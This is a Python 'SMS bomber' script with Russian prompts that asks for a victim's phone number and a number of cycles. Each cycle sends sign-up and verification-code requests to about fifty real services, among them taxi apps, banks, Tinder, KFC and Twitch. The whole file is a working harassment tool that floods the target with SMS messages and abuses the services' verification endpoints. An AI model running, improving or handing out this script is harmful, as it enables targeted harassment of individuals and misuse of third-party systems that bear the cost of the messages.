import requests, random, datetime, sys, time, argparse, os
print("")
print(" SMS Bomber ")
print("")
print(" Цель (79xxxxxxxxx): ")
_phone = "+"+input('>>> +')
print("")
print(" Количество циклов:")
_cycle = int(input('>>> '))
if _phone[0] == '+':
    _phone = _phone[1:]
if _phone[0] == '8':
    _phone = '7'+_phone[1:]
if _phone[0] == '9':
    _phone = '7'+_phone
 
_name = ''
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
 
_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
 
it = 0
while it < _cycle:
    _email = _name+'{it}'+'@gmail.com'
    email = _name+'{it}'+'@gmail.com'
    try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        print('[ + ] Grab sended!')
    except:
        print('[ERR] Grab BAD!')

    try:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
        print('[ + ] RuTaxi sended!')
    except:
        print('[ERR] RuTaxi BAD!')

    try:
        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
        print('[ + ] BelkaCar sended!')
    except:
        print('[ERR] BelkaCar BAD!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
        print('[ + ] Tinder sended!')
    except:
        print('[ERR] Tinder BAD!')
        
    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
        print('[ + ] Karusel sended!')
    except:
        print('[ERR] Karusel BAD!')
        
    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
        print('[ + ] Tinkoff sended!')
    except:
        print('[ERR] Tinkoff BAD!')
        
    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
        print('[ + ] MTS sended!')
    except:
        print('[ERR] MTS BAD!')
        
    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        print('[ + ] Youla sended!')
    except:
        print('[ERR] Youla BAD!')
        
    try:
        requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
        print('[ + ] Rabota sended!')
    except:
        print('[ERR] Rabota BAD!')
        
    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
        print('[ + ] Rutube sended!')
    except:
        print('[ERR] Rutube BAD!')
        
    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
        print('[ + ] Citilink sended!')
    except:
        print('[ERR] Citilink BAD!')
        
    try:
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
        print('[ + ] Smsint sended!')
    except:
        print('[ERR] Smsint BAD!')
        
    try:
        requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
        print('[ + ] oyorooms sended!')
    except:
        print('[ERR] oyorooms BAD!')
        
    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
        print('[ + ] MVideo sended!')
    except:
        print('[ERR] MVideo BAD!')
        
    try:
        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        print('[ + ] newnext sended!')
    except:
        print('[ERR] newnext BAD!')
        
    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
        print('[ + ] Sunlight sended!')
    except:
        print('[ERR] Sunlight BAD!')
        
    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
        print('[ + ] alpari sended!')
    except:
        print('[ERR] alpari BAD!')
        
    try:
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
        print('[ + ] Invitro sended!')
    except:
        print('[ERR] Invitro BAD!')
        
    try:
        requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
        print('[ + ] Sberbank sended!')
    except:
        print('[ERR] Sberbank BAD!')
        
    try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
        print('[ + ] Psbank sended!')
    except:
        print('[ERR] Psbank BAD!')
        
    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
        print('[ + ] Beltelcom sended!')
    except:
        print('[ERR] Beltelcom BAD!')
        
    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
        print('[ + ] Karusel sended!')
    except:
        print('[ERR] Karusel BAD!')
        
    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
        print('[ + ] KFC sended!')
    except:
        print('[ERR] KFC BAD!')
        
    try:
        requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
        print('[ + ] carsmile sended!')
    except:
        print('[ERR] carsmile BAD!')
        
    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
        print('[ + ] Citilink sended!')
    except:
        print('[ERR] Citilink BAD!')
        
    try:
        requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
        print('[ + ] Delitime sended!')
    except:
        print('[ERR] Delitime BAD!')
        
    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
        print('[ + ] findclone call sended!')
    except:
        print('[ERR] findclone BAD!')

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        print('[ + ] ICQ sended!')
    except:
        print('[ERR] ICQ BAD!')
        
    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
        print('[ + ] InDriver sended!')
    except:
        print('[ERR] InDriver BAD!')
        
    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
        print('[ + ] Invitro sended!')
    except:
        print('[ERR] Invitro BAD!')
        
    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
        print('[ + ] Pmsm sended!')
    except:
        print('[ERR] Pmsm BAD!')
        
    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
        print('[ + ] IVI sended!')
    except:
        print('[ERR] IVI BAD!')
        
    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
        print('[ + ] Mail.ru sended!')
    except:
        print('[ERR] Mail.ru BAD!')
        
    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
        print('[ + ] MVideo sended!')
    except:
        print('[ERR] MVideo BAD!')
        
    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
        print('[ + ] OK sended!')
    except:
        print('[ERR] OK BAD!')
        
    try:
        requests.post('https://plink.tech/register/',json={"phone": _phone})
        print('[ + ] Plink sended!')
    except:
        print('[ERR] Plink BAD!')
        
    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
        print('[ + ] qlean sended!')
    except:
        print('[ERR] qlean BAD!')
        
    try:
        requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
        print('[ + ] SMSgorod sended!')
    except:
        print('[ERR] SMSgorod BAD!')
        
    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
        print('[ + ] Tinder sended!')
    except:
        print('[ERR] Tinder BAD!')
        
    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
        print('[ + ] Twitch sended!')
    except:
        print('[ERR] Twitch BAD!')
        
    try:
        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
        print('[ + ] CabWiFi sended!')
    except:
        print('[ERR] CabWiFi BAD!')
        
    try:
        requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
        print('[ + ] wowworks sended!')
    except:
        print('[ERR] wowworks BAD!')
        
    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
        print('[ + ] Eda.Yandex sended!')
    except:
        print('[ERR] Eda.Yandex BAD!')
        
    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        print('[ + ] Youla sended!')
    except:
        print('[ERR] Youla BAD!')
        
    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
        print('[ + ] Alpari sended!')
    except:
        print('[ERR] Alpari BAD!')
        
    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
        print('[ + ] anytime.global sended!')
    except:
        print('[ERR] anytime.global BAD!')
        
    try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
        print('[ + ] Delivery sended!')
    except:
        print('[ERR] Delivery BAD!')
        
    try:
        it += 1
        print(('{} круг пройден.').format(it))
    except:
        break
os.system("pause")
